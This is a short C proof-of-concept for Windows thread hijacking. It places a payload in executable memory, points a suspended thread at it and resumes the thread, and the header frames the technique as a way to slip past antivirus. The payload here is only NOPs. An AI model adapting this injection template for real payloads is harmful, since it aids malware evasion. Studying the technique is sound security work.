/**
 * Created by:  VPR
 * Created:     July 17th, 2025
 *
 * Updated by:  VPR
 * Updated:     July 18th, 2025
 *
 * Description: Thread hijacking is a technique where a thread that has already
 *              been started is taken control of by an adversary, usually to
 *              perform malicious activity. One benefit from using this approach
 *              is that AV may have report the target thread as benign,
 *              potentially allowing the attacker to change the behaviour of the
 *              thread and ultimately bypass security protections.
 *
 * Disclaimer:  This program was designed as a proof-of-concept.
 *              It doesn't do anything malicious and it is not intended to do so.
 *              Don't try to use it for any malicious or illegal activity.
 *
 * License:     MIT (c) VPR, VPR Labs.
**/

#include <memoryapi.h>
#include <synchapi.h>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#endif
#include <stdlib.h>
#include <stdio.h>

DWORD WINAPI target_thread(LPVOID instance)
{
    (void)instance;
    return 0;
}

int main(void)
{
    unsigned char payload[8] = {
        0x90,  // nop
        0x90,  // nop
        0x90,  // nop
        0x90,  // nop
        0x90,  // nop
        0x90,  // nop
        0x90,  // nop
        0xC3   // ret
    };
    size_t payload_size = sizeof(payload);

    SIZE_T bytes_written = 0;
    void* mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), mem, payload, sizeof(payload), &bytes_written);

    DWORD thread_id = 0;
    HANDLE thread_handle = CreateThread(NULL, 0, target_thread, NULL, CREATE_SUSPENDED, &thread_id);

    Sleep(5000); // simulate wait for AV

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(thread_handle, &ctx);

#if       defined( _WIN64 )
    ctx.Rip = (UINT_PTR)mem;
#else  // !defined( _WIN64 )
    ctx.Eip = (UINT_PTR)mem;
#endif // defined( _WIN64 )

    SetThreadContext(thread_handle, &ctx);
    ResumeThread(thread_handle);

    CloseHandle(thread_handle);
    return 0;
}
